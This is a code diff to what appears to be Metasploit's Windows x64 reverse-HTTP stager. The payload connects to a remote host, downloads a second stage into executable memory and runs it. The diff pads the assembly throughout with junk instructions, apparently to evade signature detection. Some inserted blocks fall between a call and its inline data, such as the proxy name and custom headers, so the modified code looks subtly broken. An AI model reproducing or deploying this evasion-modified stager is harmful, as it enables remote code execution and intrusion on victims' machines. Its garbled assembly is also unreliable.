@@ -240,15 +240,35 @@ module Payload::Windows::ReverseHttp_x64
         xor rbx, rbx
       load_wininet:
         push rbx                      ; stack alignment
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r14, 'wininet'
         push r14                      ; Push 'wininet',0 onto the stack
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov rcx, rsp                  ; lpFileName (stackpointer)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call rbp
 
       internetopen:
         push rbx                      ; stack alignment
         push rbx                      ; NULL pointer
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov rcx, rsp                  ; lpszAgent ("")
     ^
 
@@ -257,6 +277,11 @@ module Payload::Windows::ReverseHttp_x64
         push 3
         pop rdx                       ; dwAccessType (3=INTERNET_OPEN_TYPE_PROXY)
         call load_proxy_name
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         db "#{proxy_info}",0x0        ; proxy information
       load_proxy_name:
         pop r8                        ; lpszProxyName (stack pointer)
@@ -264,15 +289,40 @@ module Payload::Windows::ReverseHttp_x64
     else
       asm << %Q^
         push rbx
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         pop rdx                       ; dwAccessType (0=INTERNET_OPEN_TYPE_PRECONFIG)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         xor r8, r8                    ; lpszProxyName (NULL)
       ^
     end
 
     asm << %Q^
         xor r9, r9                    ; lpszProxyBypass (NULL)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push rbx                      ; stack alignment
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push rbx                      ; dwFlags (0)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
         call rbp
 
@@ -281,12 +331,42 @@ module Payload::Windows::ReverseHttp_x64
       load_server_host:
         pop rdx                       ; lpszServerName
         mov rcx, rax                  ; hInternet
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r8, #{opts[:port]}        ; nServerPort
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         xor r9, r9                    ; lpszUsername (NULL)
         push rbx                      ; dwContent (0)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push rbx                      ; dwFlags (0)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push 3                        ; dwService (3=INTERNET_SERVICE_HTTP)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push rbx                      ; lpszPassword (NULL)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}
         call rbp
     ^
@@ -294,19 +374,49 @@ module Payload::Windows::ReverseHttp_x64
     if proxy_enabled && (proxy_user || proxy_pass)
       asm << %Q^
         mov rsi, rax                  ; Store hConnection in rsi
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
       ^
 
       if proxy_user
         asm << %Q^
         call load_proxy_user          ; puts proxy_user pointer on stack
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         db "#{proxy_user}", 0x00
       load_proxy_user:
         pop r8                        ; lpBuffer (stack pointer)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov rcx, rsi                  ; hConnection (connection handle)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push 43                       ; (43=INTERNET_OPTION_PROXY_USERNAME)
         pop rdx
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push #{proxy_user.length}     ; dwBufferLength (proxy_user length)
         pop r9
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call rbp
         ^
@@ -318,11 +428,31 @@ module Payload::Windows::ReverseHttp_x64
         db "#{proxy_pass}", 0x00
       load_proxy_pass:
         pop r8                        ; lpBuffer (stack pointer)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov rcx, rsi                  ; hConnection (connection handle)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push 44                       ; (43=INTERNET_OPTION_PROXY_PASSWORD)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         pop rdx
         push #{proxy_pass.length}     ; dwBufferLength (proxy_pass length)
         pop r9
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call rbp
         ^
@@ -339,15 +469,50 @@ module Payload::Windows::ReverseHttp_x64
       httpopenrequest:
         mov rcx, rax                  ; hConnect
         push rbx
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         pop rdx                       ; lpszVerb (NULL=GET)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         pop r8                        ; lpszObjectName (URI)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         xor r9, r9                    ; lpszVersion (NULL)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push rbx                      ; dwContext (0)
         mov rax, #{"0x%.8x" % http_open_flags}  ; dwFlags
         push rax
         push rbx                      ; lplpszAcceptType (NULL)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push rbx                      ; lpszReferer (NULL)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         call rbp
 
       prepare:
@@ -370,12 +535,32 @@ module Payload::Windows::ReverseHttp_x64
       internetsetoption:
         mov rcx, rsi                  ; hInternet (request handle)
         push 31
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         pop rdx                       ; dwOption (31=INTERNET_OPTION_SECURITY_FLAG)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push rdx                      ; stack alignment
         push #{"0x%.8x" % set_option_flags}  ; flags
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r8, rsp                   ; lpBuffer (pointer to flags)
         push 4
         pop r9                        ; dwBufferLength (4 = size of flags)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call rbp
 
@@ -386,9 +571,19 @@ module Payload::Windows::ReverseHttp_x64
     if custom_headers
       asm << %Q^
         call get_req_headers          ; lpszHeaders (pointer to the custom headers)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         db #{custom_headers}
       get_req_headers:
         pop rdx                       ; lpszHeaders
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         dec r8                        ; dwHeadersLength (assume NULL terminated)
       ^
     else
@@ -401,18 +596,68 @@ module Payload::Windows::ReverseHttp_x64
 
     asm << %Q^
         mov rcx, rsi                  ; hRequest (request handle)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         xor r9, r9                    ; lpszVersion (NULL)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         xor r9, r9                    ; lpszVersion (NULL)
         push rbx                      ; stack alignment
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push rbx                      ; dwOptionalLength (0)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         call rbp
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         test eax, eax
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         jnz allocate_memory
 
       set_wait:
         mov rcx, #{retry_wait}        ; dwMilliseconds
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
+        pop rbx
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         call rbp                      ; Sleep( dwMilliseconds );
     ^
 
@@ -421,12 +666,27 @@ module Payload::Windows::ReverseHttp_x64
       asm << %Q^
       try_it_again:
         dec rdi
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         jz failure
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         jmp retryrequest
       ^
     else
       asm << %Q^
         jmp retryrequest
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         ; retry forever
       ^
     end
@@ -440,7 +700,17 @@ module Payload::Windows::ReverseHttp_x64
       asm << %Q^
       failure:
         ; hard-coded to ExitProcess(whatever) for size
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         call rbp              ; ExitProcess(whatever)
       ^
     end
@@ -448,26 +718,76 @@ module Payload::Windows::ReverseHttp_x64
     asm << %Q^
       allocate_memory:
         push rbx
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         pop rcx                       ; lpAddress (NULL)
         push 0x40
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         pop rdx
         mov r9, rdx                   ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
         shl edx, 16                   ; dwSize
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp
 
       download_prep:
         xchg rax, rbx                 ; store the allocated base in rbx
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push rbx                      ; store a copy for later
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         push rbx                      ; temp storage for byte count
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov rdi, rsp                  ; rdi is the &bytesRead
 
       download_more:
         mov rcx, rsi                  ; hFile (request handle)
         mov rdx, rbx                  ; lpBuffer (pointer to mem)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r8, 8192                  ; dwNumberOfBytesToRead (8k)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r9, rdi                   ; lpdwNumberOfByteRead (stack pointer)
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
         call rbp
         add rsp, 32                   ; clean up reserved space
@@ -476,11 +796,26 @@ module Payload::Windows::ReverseHttp_x64
         jz failure
 
         mov ax, word ptr [rdi]        ; extract the read byte count
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         add rbx, rax                  ; buffer += bytes read
 
         test eax, eax                 ; are we done?
         jnz download_more             ; keep going
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         pop rax                       ; clear up reserved space
+        nop
+        mov rsi,rsi
+        push rbx
+        nop
+        pop rbx
         pop rax                       ; realign again
 
       execute_stage:
